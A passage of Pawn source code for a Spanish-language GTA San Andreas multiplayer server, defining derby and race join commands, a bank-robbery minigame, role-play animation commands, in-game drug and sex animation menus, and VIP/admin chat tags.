			SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
			PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
			TextDrawShowForPlayer(playerid, TD_DERBY_Message);
			GameTextForPlayer(playerid, DI[NAME], 3000, 6);
		}
		case DERBY_RUNNING:
		{
			DI[PLAYERSD] ++;

			SetPlayerVirtualWorld(playerid, DERBY_VIRTUAL_WORLD);
			PI[playerid][P_DERBY_STATUS] = PD_NORMAL;

			PI[playerid][P_GAMEMODE] = GAME_DERBY;
			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerInterior(playerid, 0);
			ResetPlayerWeapons(playerid);
			SetPlayerVirtualWorld(playerid, DERBY_VIRTUAL_WORLD);
			if(IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
			{
				DestroyVehicle(PI[playerid][P_DERBY_VEHICLEID]);
				PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
			}
			TogglePlayerControllable(playerid, true);

			TextDrawShowForPlayer(playerid, TD_DERBY);
			TextDrawShowForPlayer(playerid, TD_DERBY_Message);

			PI[playerid][P_DERBY_STATUS] = PD_DEAD;
			for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PI[i][P_GAMEMODE] == GAME_DERBY)
					{
						if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
						{
							PI[playerid][P_DERBY_SPECTATEPLAYER] = i;
							break;
						}
					}
				}
			}

			TogglePlayerSpectating(playerid, true);
			PlayerSpectateVehicle(playerid, PI[ PI[playerid][P_DERBY_SPECTATEPLAYER] ][P_DERBY_VEHICLEID]);
			SendClientMessage(playerid, -1, "Presiona la tecla {45D0FF}INTRO {FFFFFF}para cambiar de jugador.");
			return 1;
		}
	}
	return 1;
}

CMD:entrard(playerid,params[]){
	#pragma unused params
	cmd_derby(playerid,"\1");
	return 1;
}

CMD:aderby(playerid,params[]){
	#pragma unused params
	cmd_derby(playerid,"\1");
	return 1;
}

CMD:carrera(playerid,params[])
{
    if(IsPlayerInAnyVehicle(playerid) == 1) {
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar fuera del vehiculo para usar este comando.");
	return 1;
	}
	if(RaceStarted == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} La carrera ya ha empezado, espera a que acabe.");
	if(RaceBusy == 0x00) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No hay ninguna carrera para unirte.");
	if(Joined[playerid] == true) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en una carrera.");
	if(IsPlayerInAnyVehicle(playerid)) return SetTimerEx("SetupRaceForPlayer", 2500, 0, "e", playerid), RemovePlayerFromVehicle(playerid), SetPVarInt(playerid, "JoinedToRRAce", true), Joined[playerid] = true;
    BloquearComandosInRace[playerid] = 1;
	SetupRaceForPlayer(playerid);
	Joined[playerid] = true;
	SetPVarInt(playerid, "JoinedToRRAce", true);
	Race[InRace]++;
 	pRace[playerid][pInRace] = 1;
 	TextDrawHideForPlayer(playerid, TComandos);
 	TextDrawShowForPlayer(playerid, TRace);
	TextDrawShowForPlayer(playerid, TRaceTiempoRestante);
	TextDrawShowForPlayer(playerid, TRaceJugadores);
	TextDrawShowForPlayer(playerid, TCheckpoint);
	TogglePlayerControllable(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	PosCP_X=0;
	PosCP_Y=0;
	PosCP_Z=0;
	//PlayerInfo[playerid][DoorsLocked] = 1;
	return 1;
}
CMD:joinrace(playerid,params[]){
	#pragma unused params
	cmd_carrera(playerid,"\1");
	return 1;
}
CMD:entrarc(playerid,params[]){
	#pragma unused params
	cmd_carrera(playerid,"\1");
	return 1;
}

CMD:robbank(playerid,params[])
{
	#pragma unused params
	{
		new rbank;
		rbank = random(5);
		if(GetPlayerWantedLevel(playerid) > 0)
		{
		    SendClientMessage(playerid,red, "|Error| »{EAEAEA} No puedes robar el banco mientras tengas estrellas de busqueda.");
			SendClientMessage(playerid,red, "|Info| »{EAEAEA} Tus estrellas de busqueda se reducirán cada 10 minutos.");
			return 1;
		}
		if(CloseToBank(playerid) == 999)
		{
		    SendClientMessage(playerid,red, "|Error| »{EAEAEA} Tienes que estar en el banco para poder robar.");
		    return 1;
		}
    	if(BankRobbedRecently >=1 ) {
    	    SendClientMessage(playerid,red, "|Error| »{EAEAEA} El banco ya ha sido robado, espera unos minutos...");
	    	return 1;
    	}
    	if(GetPlayerWantedLevel(playerid) == 0)
		{
			if(BankRobbedRecently == 1)
			{
			    GameTextForPlayer(playerid, "~r~El banco~n~~w~ya ha sido robado~n~espera unos minutos...",5000,5);
				return 1;
			}
			if(BankRobbedRecently == 0)
		    {
				switch(rbank)
				{
					case 2:
					{
				    	GameTextForPlayer(playerid, "~r~Robo fallido!",5000,3);
			    		new plwl = GetPlayerWantedLevel(playerid);
						SetPlayerWantedLevel(playerid, plwl +1 );
						SetTimer("BankRobbedRecentlyTimer",600000,0);
				    	return 1;
					}
					case 4:
				    {
		 				GameTextForPlayer(playerid, "~r~Robo fallido!",5000,3);
		 				new plwl = GetPlayerWantedLevel(playerid);
						SetPlayerWantedLevel(playerid, plwl +1 );
						SetTimer("BankRobbedRecentlyTimer",600000,0);
				    	return 1;
					}
					case 5:
					{
		 				GameTextForPlayer(playerid, "~r~Robo fallido!",5000,3);
		 				new plwl = GetPlayerWantedLevel(playerid);
						SetPlayerWantedLevel(playerid, plwl +1 );
						BankRobbedRecently = 1;
						SetTimer("BankRobbedRecentlyTimer",600000,0);
				    	return 1;
					}
				}
				new rcash = random(30000);
				GivePlayerMoney(playerid,rcash);
				SavePlayer(playerid);
				new str[128];
				format(str,sizeof(str),"~w~Robaste~n~$%d",rcash);
				GameTextForPlayer(playerid,str,5000,3);
				new plwl = GetPlayerWantedLevel(playerid);
				SetPlayerWantedLevel(playerid, plwl +3);
				new pname[24];
				GetPlayerName(playerid, pname, 24);
				format(str,sizeof(str),"|Bank| » {0080FF}%s{EAEAEA} ha robado {52C433}$%d{EAEAEA} del banco.",pname,rcash);
				SendClientMessageToAll(red,str);
				BankRobbedRecently = 1;
				SetTimer("BankRobbedRecentlyTimer",600000,0);
				return 1;
			}
		}
		else
		{
			return 1;
		}
	}
	RecentCrime[playerid] += 200;
	return 1;
}
CMD:rendirse(playerid,params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	}
	return 1;
}
CMD:rollfall(playerid,params[])
{
	ApplyAnimation(playerid,"PED","BIKE_fallR",4.0,0,1,1,1,0);
	ApplyAnimation(playerid,"PED","BIKE_fallR",4.0,0,1,1,1,0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:borracho(playerid,params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
	ApplyAnimation(playerid,"PED", "WALK_DRUNK",4.0,1,1,1,1,500);
	ApplyAnimation(playerid,"PED", "WALK_DRUNK",4.0,1,1,1,1,500);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	}
	return 1;
}
CMD:arrestar(playerid,params[])
{
	ApplyAnimation( playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1,500);
	ApplyAnimation( playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1,500);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:amenazar(playerid,params[])
{
	ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 0, 0, 0, 1,500);
	ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 0, 0, 0, 1,500);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:paja(playerid,params[])
{
	ApplyAnimation(playerid, "PAULNMAC", "wank_loop", 4.0, 1, 0, 0, 1, 0);
	ApplyAnimation(playerid, "PAULNMAC", "wank_loop", 4.0, 1, 0, 0, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:agredido(playerid,params[])
{
	ApplyAnimation(playerid, "POLICE", "crm_drgbst_01", 4.0, 0, 0, 0, 1, 0);
	ApplyAnimation(playerid, "POLICE", "crm_drgbst_01", 4.0, 0, 0, 0, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:herido(playerid,params[])
{
	ApplyAnimation(playerid, "SWEET", "LaFin_Sweet", 4.0, 0, 1, 1, 1, 0);
	ApplyAnimation(playerid, "SWEET", "LaFin_Sweet", 4.0, 0, 1, 1, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:recostarse(playerid,params[])
{
	ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_in", 4.0, 0, 0, 0, 1, 0);
	ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_in", 4.0, 0, 0, 0, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:pararse(playerid,params[])
{
	ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_out", 4.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_out", 4.0, 0, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:cubrirse(playerid,params[])
{
	ApplyAnimation(playerid, "ped", "cower", 4.0, 1, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ped", "cower", 4.0, 1, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:vomitar(playerid,params[])
{
	ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:comer(playerid,params[])
{
	ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:palmada(playerid,params[])
{
	ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:agonizar(playerid,params[])
{
	ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);
	ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:mear(playerid,params[])
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_PISSING);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_PISSING);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:spray(playerid,params[])
{
	ApplyAnimation(playerid,"SPRAYCAN","SPRAYCAN_FIRE",4.0, 0, 0, 0, 0, -1);
	ApplyAnimation(playerid,"SPRAYCAN","SPRAYCAN_FIRE",4.0, 0, 0, 0, 0, -1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:shop(playerid,params[])
{
	ApplyAnimation(playerid,"SHOP","SHP_DUCK_AIM",4.0, 0, 0, 0, 0, -1);
	ApplyAnimation(playerid,"SHOP","SHP_DUCK_AIM",4.0, 0, 0, 0, 0, -1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:sentarse(playerid,params[])
{
	ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_in", 4.000000, 0, 1, 1, 1, 0);
	ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_in", 4.000000, 0, 1, 1, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:llamar(playerid,params[])
{
	ApplyAnimation(playerid, "ped", "phone_in", 4.000000, 0, 0, 0, 1, 4000);
	ApplyAnimation(playerid, "ped", "phone_in", 4.000000, 0, 0, 0, 1, 4000);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:colgar(playerid,params[])
{
	ApplyAnimation(playerid, "ped", "phone_out", 4.000000, 0, 1, 1, 0, 0);
	ApplyAnimation(playerid, "ped", "phone_out", 4.000000, 0, 1, 1, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:piquero(playerid,params[])
{
	ApplyAnimation(playerid, "DAM_JUMP", "DAM_Launch", 4.0, 0, 1, 1, 1, 1);
	ApplyAnimation(playerid, "DAM_JUMP", "DAM_Launch", 4.0, 0, 1, 1, 1, 1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:taichi(playerid,params[])
{
	ApplyAnimation(playerid, "PARK", "Tai_Chi_Loop",  4.1,7,5,1,1,1);
	ApplyAnimation(playerid, "PARK", "Tai_Chi_Loop",  4.1,7,5,1,1,1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:boxear(playerid,params[])
{
	ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox",  4.1,7,5,1,1,1);
	ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox",  4.1,7,5,1,1,1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:rodar(playerid,params[])
{
	ApplyAnimation(playerid,"MD_CHASE","MD_HANG_Lnd_Roll",4.1,0,1,1,1,0);
	ApplyAnimation(playerid,"MD_CHASE","MD_HANG_Lnd_Roll",4.1,0,1,1,1,0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:sanar(playerid,params[])
{
	ApplyAnimation(playerid,"MEDIC","CPR",4.1,0,0,0,0,0);
	ApplyAnimation(playerid,"MEDIC","CPR",4.1,0,0,0,0,0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:dormir(playerid,params[])
{
	ApplyAnimation(playerid,"INT_HOUSE","BED_In_R",4.1,0,0,0,1,0);
	ApplyAnimation(playerid,"INT_HOUSE","BED_In_R",4.1,0,0,0,1,0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:echarse(playerid,params[])
{
	ApplyAnimation(playerid,"SUNBATHE","SitnWait_in_W",4.000000, 0, 0, 0, 1, 0);
	ApplyAnimation(playerid,"SUNBATHE","SitnWait_in_W",4.000000, 0, 0, 0, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:asientosexy(playerid,params[])
{
	ApplyAnimation(playerid,"SUNBATHE","ParkSit_W_idleA",4.000000, 0, 1, 1, 1, 0);
	ApplyAnimation(playerid,"SUNBATHE","ParkSit_W_idleA",4.000000, 0, 1, 1, 1, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:adolorido(playerid,params[])
{
	ApplyAnimation(playerid,"PED","KO_shot_stom",4.1,0,1,1,1,1);
	ApplyAnimation(playerid,"PED","KO_shot_stom",4.1,0,1,1,1,1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:tullio(playerid,params[])
{
	ApplyAnimation(playerid,"PED","WALK_old",4.0,1,1,1,1,500);
	ApplyAnimation(playerid,"PED","WALK_old",4.0,1,1,1,1,500);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:mujer(playerid,params[])
{
	ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,1,1,1,1,500);
	ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,1,1,1,1,500);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:wooo(playerid,params[])
{
	ApplyAnimation(playerid,"ON_LOOKERS","shout_02",4.1,7,5,1,1,1);
	ApplyAnimation(playerid,"ON_LOOKERS","shout_02",4.1,7,5,1,1,1);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:bailar(playerid,params[])
{
	new Bailar[128], Index;
	Bailar = strtok(params,Index);
	if(strval(Bailar) == 1) {
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa la tecla {919770}ENTER.");
	}else if(strval(Bailar) == 2) {
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa la tecla {919770}ENTER.");
	}
	else if(strval(Bailar) == 3) {
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa la tecla {919770}ENTER.");
	}
	else if(strval(Bailar) == 4) {
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa la tecla {919770}ENTER.");
	}
	else {
		return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Bailar [1-4]");
	}
	return 1;
}

CMD:vino(playerid,params[])
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Usa la tecla {919770}CTRL{FFFFFF} para tomar vino.");
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Para detener la animación usa {C0C0C0}/PararAnim.");
	return 1;
}
CMD:fumar(playerid,params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Usa la tecla {919770}CTRL{FFFFFF} para fumar el cigarro.");
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} To stop the animation type {C0C0C0}/PararAnim.");
	return 1;
}
CMD:pararanim(playerid,params[])
{
	ClearAnimations(playerid);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} Animación detenida.");
	return 1;
}
CMD:anims(playerid,params[])
{
	#pragma unused params
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}ANIMACIONES", "{FFA500}/Rendirse, /RollFall, /Borracho, /Arrestar, /Amenazar, /Boxear.\n/Paja, /Agredido, /Herido, /Recostarse, /Pararse, /Taichi.\n/Cubrirse, /Vomitar, /Comer, /Palmada, /Agonizar, /Piquero.\n/Mear, /Spray, /Shop, /Sentarse, /Llamar, /Colgar.\n/Rodar, /Sanar, /Dormir, /echarse, /asientosexy, /Adolorido.\n/Tullio, /Mujer, /Wooo, /Bailar [1-4], /Fumar, /Vino.", "Aceptar", "");
	return 1;
}

CMD:drogas(playerid,params[])
{
    ShowPlayerDialog(playerid, Drogas, DIALOG_STYLE_LIST, "Menu de Drogas", "Marihuana\t\t{00FF00}$4.000\t\t{FF0000}El efecto durara 3 minutos\nHeroina\t\t{00FF00}$5.000\t\t{FF0000}El efecto durara 4 minutos\nCocaina\t\t{00FF00}$5.000\t\t{FF0000}El efecto durara 4 minutos\nExtasis\t\t\t{00FF00}$7.000\t\t{FF0000}El efecto durara 5 minutos\nLSD\t\t\t{00FF00}$10.000\t\t{FF0000}El efecto durara 8 minutos\nMetanfetamina\t\t{00FF00}$10.000\t\t{FF0000}El efecto durara 8 minutos", "Seleccionar", "Cancelar");
	 return 1;
}


CMD:sexo(playerid, params[])
{
    ShowPlayerDialog(playerid, Sexo, DIALOG_STYLE_LIST, "Menu Acciones De Sexo:", "En Cuatro\nEn Cuatro 2\nEn Cuatro 3\nNalgada\nNalgada 2\nNalgada 3\nChupamela\nChupamela 2\nChupamela 3\nChupamela 4\nChupamela 5\nChupamela 6\nMamar\nMamar 2\nMamar 3\nMamar 4\nMamar 5", "Aceptar", "Cancelar");
	return 1;
}

CMD:sexo2(playerid, params[])
{
    ShowPlayerDialog(playerid, AnimSexo, DIALOG_STYLE_LIST, "Sexo DL", "Posicion 1\nPosicion 2\nPosicion 3\nPosicion 4\nPosicion 5\nPosicion 6\nPosicion 7\nPosicion 8\nPosicion 9\nPosicion 10\nPosicion 11\nPosicion 12\nPosicion 13\nPosicion 14\nPosicion 15\nPosicion 16\nPosicion 17\nPosicion 18\nPosicion 19\nPosicion 20", "Seleccionar", "Cancelar");
	return 1;
}
	

CMD:chatcolor(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		ShowPlayerDialog(playerid, ChatColor, DIALOG_STYLE_LIST, "Chat de colores", "{FF0000}*{FFFFFF} Chat Negro\n{FF0000}*{FFFFFF} Chat Rojo\n{FF0000}*{FFFFFF} Chat Azul\n{FF0000}*{FFFFFF} Chat Verde\n{FF0000}*{FFFFFF} Chat Amarillo\n{FF0000}*{FFFFFF} Chat Rosa\n{FF0000}*{FFFFFF} Chat Celeste\n{FF0000}*{FFFFFF} Chat Naranja\n{FF0000}*{FFFFFF} Chat Violeta\n{FF0000}*{FFFFFF} Chat Dorado\n{FF0000}*{FFFFFF} Chat Marron\n{FF0000}*{FFFFFF} Chat Gris\n{FF0000}Desactivar chat de color", "Seleccionar", "Salir");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:towner(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		if(TagActivado[playerid] == 0) {
            if(ChatColorActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				TagOwner[playerid] = 1;
				TagActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tag owner activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el el chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un tag activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	return 1;
}
CMD:tencargado(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		if(TagActivado[playerid] == 0) {
            if(ChatColorActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				TagEncargado[playerid] = 1;
				TagActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tag encargado activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el el chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un tag activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
CMD:tadmin(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(TagActivado[playerid] == 0) {
            if(ChatColorActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				TagAdmin[playerid] = 1;
				TagActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tag admin activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el el chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un tag activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:tadmin2(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(TagActivado[playerid] == 0) {
            if(ChatColorActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				TagAdmin2[playerid] = 1;
				TagActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tag admin 2 activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el el chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un tag activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:tvip(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
		if(TagActivado[playerid] == 0) {
            if(ChatColorActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				TagVip[playerid] = 1;
				TagActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tag vip activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el el chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un tag activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:dtag(playerid,params[])
#pragma unused params
{
	if(TagActivado[playerid] == 1) {
		if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			TagOwner[playerid] = 0;
			TagActivado[playerid] = 0;
			//SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag owner desactivado.");
		}
		if(PlayerInfo[playerid][Level] >= 9) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			TagEncargado[playerid] = 0;
			TagActivado[playerid] = 0;
			//SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag encargado desactivado.");
		}
		if(PlayerInfo[playerid][Level] >= 1) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			TagAdmin[playerid] = 0;
			TagActivado[playerid] = 0;
			//SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag admin desactivado.");
		}
		if(PlayerInfo[playerid][Level] >= 1) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			TagAdmin2[playerid] = 0;
			TagActivado[playerid] = 0;
			//SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag admin 2 desactivado.");
		}
		if(PlayerInfo[playerid][Vip] >= 1) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			TagVip[playerid] = 0;
			TagActivado[playerid] = 0;
			//SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag vip desactivado.");
		}
		SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tag desactivado.");
